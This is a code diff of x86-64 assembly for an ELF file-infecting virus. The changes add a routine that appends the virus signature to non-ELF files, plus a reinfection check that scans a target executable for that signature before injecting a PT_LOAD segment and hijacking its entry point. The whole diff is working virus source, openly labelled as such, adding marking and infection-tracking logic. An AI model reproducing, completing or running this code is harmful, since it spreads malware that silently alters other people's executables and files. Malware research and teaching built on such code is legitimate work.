@@ -444,23 +444,23 @@ virus_infect_elf:
     syscall
 
     cmp rax, 64
-    jl .vi_close_fail
+    jl .vi_handle_non_elf
 
     ; Check ELF magic
     lea rdi, [rbp-112]
     cmp dword [rdi], 0x464c457f ; "\x7fELF"
-    jne .vi_close_fail
+    jne .vi_handle_non_elf
 
     ; Check ELF class (must be 64-bit)
     cmp byte [rdi+4], 2
-    jne .vi_close_fail
+    jne .vi_handle_non_elf
 
     ; Check e_type (2=ET_EXEC or 3=ET_DYN)
     movzx eax, word [rdi+16]
     cmp ax, 2
     je .vi_valid_elf_type
     cmp ax, 3
-    jne .vi_close_fail
+    jne .vi_handle_non_elf
 
 .vi_valid_elf_type:
     ; ============================================
@@ -762,6 +762,89 @@ virus_infect_elf:
 
     jmp .vi_done
 
+; ============================================
+; Handle non-ELF files - check for signature and append if not present
+; ============================================
+.vi_handle_non_elf:
+    ; File is not a valid ELF64 executable
+    ; Check if it already contains the signature
+    ; Seek to beginning
+    mov eax, SYS_LSEEK
+    mov edi, r13d
+    xor esi, esi
+    xor edx, edx
+    syscall
+    
+    xor rbx, rbx                ; current file position
+    mov r14, [rbp-8]            ; file size
+
+.vi_non_elf_sig_loop:
+    ; Read a chunk of the file
+    mov eax, SYS_READ
+    mov edi, r13d
+    lea rsi, [rbp-4224]         ; buffer on stack
+    mov edx, 4096
+    syscall
+
+    test rax, rax
+    jle .vi_non_elf_append      ; EOF or error, signature not found
+
+    ; Search for signature in buffer
+    push rax                    ; save bytes_read
+    lea rdi, [rbp-4224]         ; buffer
+    mov rsi, rax                ; bytes_read
+    lea rdx, [r15 + v_signature - virus_start]  ; signature
+    mov rcx, v_signature_len    ; signature length
+    call virus_search_signature
+    
+    pop rcx                     ; restore bytes_read into rcx
+    
+    ; If found, file already has signature
+    test rax, rax
+    jnz .vi_close_fail          ; skip - already has signature
+
+    ; Update position and check if more to read
+    add rbx, rcx                ; bytes read
+    cmp rbx, r14                ; compare with file size
+    jge .vi_non_elf_append      ; done reading, append signature
+
+    ; Seek back slightly to handle signatures that span chunk boundaries
+    mov rsi, rbx
+    sub rsi, v_signature_len
+    add rsi, 1
+    test rsi, rsi
+    js .vi_non_elf_append       ; shouldn't happen, but be safe
+    
+    mov eax, SYS_LSEEK
+    mov edi, r13d
+    xor edx, edx                ; SEEK_SET
+    syscall
+    
+    test rax, rax
+    js .vi_non_elf_append
+    
+    mov rbx, rax                ; update position
+    jmp .vi_non_elf_sig_loop
+
+.vi_non_elf_append:
+    ; Append the signature to the file
+    ; Seek to end of file
+    mov eax, SYS_LSEEK
+    mov edi, r13d
+    xor esi, esi
+    mov edx, SEEK_END
+    syscall
+    
+    ; Write the signature
+    mov eax, SYS_WRITE
+    mov edi, r13d
+    lea rsi, [r15 + v_signature - virus_start]
+    mov edx, v_signature_len
+    syscall
+    
+    ; Close file and done
+    jmp .vi_close_fail
+
 .vi_close_fail:
     mov eax, SYS_CLOSE
     mov edi, r13d
@@ -850,6 +933,83 @@ add_pt_load:
 
     cmp rax, 64
     jl .add_pt_load_close_fail
+
+    ; ============================================
+    ; Check if file is already infected by searching for signature
+    ; ============================================
+    ; Seek to beginning
+    mov eax, SYS_LSEEK
+    mov edi, r13d
+    xor esi, esi
+    xor edx, edx
+    syscall
+    
+    xor rbx, rbx                ; current file position
+    mov r14, [rbp-8]            ; file size
+
+.apt_sig_check_loop:
+    ; Read a chunk of the file
+    mov eax, SYS_READ
+    mov edi, r13d
+    lea rsi, [rel sig_check_buf]
+    mov edx, BUFFER_SIZE
+    syscall
+
+    test rax, rax
+    jle .apt_sig_check_done     ; EOF or error, not found
+
+    ; Search for signature in buffer
+    push rax                    ; save bytes_read
+    lea rdi, [rel sig_check_buf]
+    mov rsi, rax                ; bytes_read
+    lea rdx, [rel signature]
+    mov rcx, signature_len
+    call search_substring
+    
+    pop rcx                     ; restore bytes_read into rcx
+    
+    ; If found, file is already infected
+    test rax, rax
+    jnz .add_pt_load_close_fail ; skip - already infected
+
+    ; Update position and check if more to read
+    add rbx, rcx                ; bytes read
+    cmp rbx, r14                ; compare with file size
+    jge .apt_sig_check_done     ; done reading
+
+    ; Seek back slightly to handle signatures that span chunk boundaries
+    mov rsi, rbx
+    sub rsi, signature_len
+    add rsi, 1
+    test rsi, rsi
+    js .apt_sig_check_done      ; shouldn't happen, but be safe
+    
+    mov eax, SYS_LSEEK
+    mov edi, r13d
+    xor edx, edx                ; SEEK_SET
+    syscall
+    
+    test rax, rax
+    js .apt_sig_check_done
+    
+    mov rbx, rax                ; update position
+    jmp .apt_sig_check_loop
+
+.apt_sig_check_done:
+    ; File is not infected, proceed with infection
+    ; Seek back to beginning to read ELF header again
+    mov eax, SYS_LSEEK
+    mov edi, r13d
+    xor esi, esi
+    xor edx, edx
+    syscall
+    
+    ; Read ELF header again
+    mov eax, SYS_READ
+    mov edi, r13d
+    lea rsi, [rel elf_header_buf]
+    mov edx, 64
+    syscall
 
     ; Get and save original entry point
     lea rdi, [rel elf_header_buf]
